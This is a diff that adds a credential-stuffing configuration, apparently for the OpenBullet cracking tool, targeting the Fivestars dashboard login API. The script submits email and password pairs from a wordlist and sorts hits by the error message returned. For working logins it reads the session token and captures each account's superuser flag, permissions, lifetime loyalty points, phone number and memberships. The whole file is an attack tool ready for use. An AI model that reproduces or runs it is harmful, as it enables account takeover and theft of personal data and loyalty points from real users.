@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "5stars",
+  "SuggestedBots": 30,
+  "LastModified": "2019-07-12T10:37:24.7706497-04:00",
+  "AdditionalInfo": "",
+  "Author": "TrippyCat",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://dashboard.fivestars.com/api/v2/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Invalid email/password combination" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email/password combination" 
+    KEY "JSON format was invalid" 
+
+#TOKEN PARSE "<SOURCE>" JSON "session_token" -> VAR "TOKEN" 
+
+REQUEST GET "https://dashboard.fivestars.com/api/v2/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Session-Token: <TOKEN>" 
+
+#SU? PARSE "<SOURCE>" JSON "is_superuser" -> CAP "Is SuperUser?" 
+
+#PERMS. PARSE "<SOURCE>" JSON "permissions" -> CAP "Permissions" 
+
+#POINTS PARSE "<SOURCE>" JSON "lifetime_points" -> CAP "Lifetime Points" 
+
+#PHONE PARSE "<SOURCE>" JSON "phone" -> CAP "Phone #" 
+
+#MEMBERSHIPS/LOYALTY PARSE "<SOURCE>" JSON "redeemed_business" Recursive=TRUE -> CAP "Memberships" 
+
